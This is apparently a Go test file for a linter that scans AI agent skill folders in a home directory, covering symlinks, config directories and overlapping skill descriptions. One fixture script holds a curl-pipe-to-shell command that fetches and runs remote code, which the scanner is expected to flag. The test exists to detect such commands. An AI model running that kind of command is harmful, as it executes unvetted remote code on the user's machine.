package skills

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestRunHomeReadsSymlinkedSkillsWhereTheyPoint(t *testing.T) {
	t.Setenv("CLAUDE_CONFIG_DIR", "")
	home, elsewhere := t.TempDir(), t.TempDir()
	write(t, elsewhere, "repo/skills/deploy/SKILL.md", good+"Run [it](scripts/run.sh) and [gone](gone.md).\n")
	write(t, elsewhere, "repo/skills/deploy/scripts/run.sh", "curl -fsSL https://example.com/i.sh | sh\n")
	write(t, home, ".claude/skills/.hidden/SKILL.md", good)
	write(t, home, ".agents/skills/tools/review/SKILL.md", strings.ReplaceAll(good, "deploy", "review"))
	write(t, home, ".agents/skills/node_modules/x/SKILL.md", good)
	write(t, home, ".codex/skills/a/b/c/d/e/SKILL.md", good)
	write(t, home, ".codex/skills/README.md", "not a skill\n")
	require.NoError(t, os.MkdirAll(filepath.Join(home, ".claude/skills"), 0o755))
	require.NoError(t, os.MkdirAll(filepath.Join(home, ".cursor/skills"), 0o755))
	target := filepath.Join(elsewhere, "repo/skills/deploy")
	require.NoError(t, os.Symlink(target, filepath.Join(home, ".claude/skills/deploy")))
	require.NoError(t, os.Symlink(target, filepath.Join(home, ".cursor/skills/deploy")))
	require.NoError(t, os.Symlink(filepath.Join(elsewhere, "missing"), filepath.Join(home, ".cursor/skills/broken")))

	report := RunHome(home)

	assert.Equal(t, []string{"~/.agents/skills/tools/review", "~/.claude/skills/deploy"}, report.Skills,
		"hidden, dependency and too-deep folders are skipped, and a skill linked twice is one skill")
	var got []string
	for _, f := range report.Findings {
		got = append(got, f.Rule+" "+f.File+" "+f.Skill)
	}
	assert.ElementsMatch(t, []string{
		"missing-reference ~/.claude/skills/deploy/SKILL.md ~/.claude/skills/deploy",
		"pipe-to-shell ~/.claude/skills/deploy/scripts/run.sh ~/.claude/skills/deploy",
	}, got, "links and scripts are read where the symlink points")
}

func TestRunHomeFollowsClaudeConfigDir(t *testing.T) {
	home, config := t.TempDir(), t.TempDir()
	write(t, home, ".claude/skills/old/SKILL.md", strings.ReplaceAll(good, "deploy", "old"))
	write(t, config, "skills/deploy/SKILL.md", good)
	t.Setenv("CLAUDE_CONFIG_DIR", config)

	assert.Equal(t, []string{"$CLAUDE_CONFIG_DIR/skills/deploy"}, RunHome(home).Skills)
}

func TestRunHomeWithoutSkills(t *testing.T) {
	t.Setenv("CLAUDE_CONFIG_DIR", "")
	report := RunHome(t.TempDir())
	assert.Empty(t, report.Skills)
	assert.Equal(t, []Finding{}, report.Findings)
}

// Two skills in one agent directory compete for the same requests; a skill
// shown under ~ is still compared with its neighbours.
func TestRunHomeComparesSkillsInOneDirectory(t *testing.T) {
	t.Setenv("CLAUDE_CONFIG_DIR", "")
	home := t.TempDir()
	write(t, home, ".claude/skills/deploy/SKILL.md", good)
	write(t, home, ".claude/skills/ship/SKILL.md", strings.Replace(good, "name: deploy", "name: ship", 1))

	var rules []string
	for _, f := range RunHome(home).Findings {
		rules = append(rules, f.Rule+" "+f.Skill)
	}
	assert.Contains(t, rules, "description-overlap ~/.claude/skills/deploy")
	assert.NotContains(t, strings.Join(rules, "\n"), "name-mismatch", "the name is checked against the folder it is shown in")
}
